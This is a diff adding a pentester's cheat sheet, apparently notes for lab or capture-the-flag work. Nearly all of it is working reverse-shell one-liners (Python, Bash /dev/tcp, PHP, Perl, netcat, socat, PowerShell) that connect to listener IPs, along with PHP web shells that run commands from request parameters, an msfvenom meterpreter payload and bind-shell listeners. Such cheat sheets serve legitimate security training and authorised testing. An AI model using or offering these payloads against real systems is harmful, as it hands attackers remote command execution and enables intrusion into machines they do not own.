@@ -1,0 +1,91 @@
+  GENERATE WEBSHELL WITH MSFVENOM:
+    msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.25 lport=4444 -f raw         //handle with metasploit multi handler
+
+ADD CLEAR IN SHELL (AFTER UPGRADE):
+    export TERM=xterm
+
+UPGRADE SHELL:
+    __import__('os').system('/bin/bash')
+    python3 -c 'import pty; pty.spawn("/bin/sh")'
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    echo os.system('/bin/bash')
+    /bin/sh -i
+    perl -e 'exec "/bin/sh";'
+    perl: exec "/bin/sh";
+    ruby: exec "/bin/sh"
+    lua: os.execute('/bin/sh')
+    (From within IRB)
+    exec "/bin/sh"
+    (From within vi)
+    :!bash
+    (From within vi)
+    :set shell=/bin/bash:shell
+    (From within nmap interactive mode nmap --interactive   //only older versions)
+    !sh
+    !/bin/sh
+    !/bin/bash
+    /usr/bin/script -qc /bin/bash /dev/null
+
+REVERSE SHELL
+
+    //PYTHON ONE LINER:
+    python3 -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+    __import__('os').system('bash -i >& /dev/tcp/10.10.14.69/4444 0>&1')		//PYTHON
+    <?php echo shell_exec($_GET['cmd']);?>                              //activate with: http://10.10.10.175/<path where it is uploaded>/revshell.php?cmd=<command (for rev shell maybe)>
+    <?php echo system($_REQUEST["cmd"]);?>
+    <?php $sock = fsockopen("192.168.119.201",80);$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?> 
+    
+
+    PHP one line rev shell (terminal):
+        php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+    Bash TCP
+
+        bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+
+        0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+
+        /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+
+    Bash UDP
+
+        Victim:
+            sh -i >& /dev/udp/10.0.0.1/4242 0>&1
+
+        Listener:
+            nc -u -lvp 4242
+
+    perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+
+    //Windows only
+    cmd.exe /c nc.exe -e cmd.exe 192.168.119.218 80
+
+    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+    nc -nv 10.11.2.22 4444 -e /bin/bash
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.5 4444 >/tmp/f
+
+	socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+
+    //powershell one-liner
+    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+
+
+BIND SHELL:                 //to connect to bind shells use netcat as client
+    nc -nlvp 4444 -e /bin/bash
+    nc -nlvp 4444 -e cmd.exe
+    socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash       //socat encrypted bind shell
+    powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+
+
+
+
+
+
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
